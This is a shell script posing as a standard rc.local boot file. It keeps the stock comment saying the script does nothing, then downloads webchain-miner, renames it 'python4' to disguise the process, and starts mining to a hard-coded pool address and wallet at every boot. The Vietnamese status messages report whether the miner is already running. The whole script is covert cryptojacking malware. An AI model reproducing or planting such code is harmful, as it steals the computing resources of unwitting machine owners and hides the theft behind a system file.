#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python4 ]; then
    if pgrep -x "python4" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python4 -o 116.109.75.4:9781 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=1 --worker-id=co8

     
fi
exit
fi


wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
mv webchain-miner python4
rm config.json
./python4 -o 116.109.75.4:9781 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x --donate-level=0 --worker-id=co8

exit 0
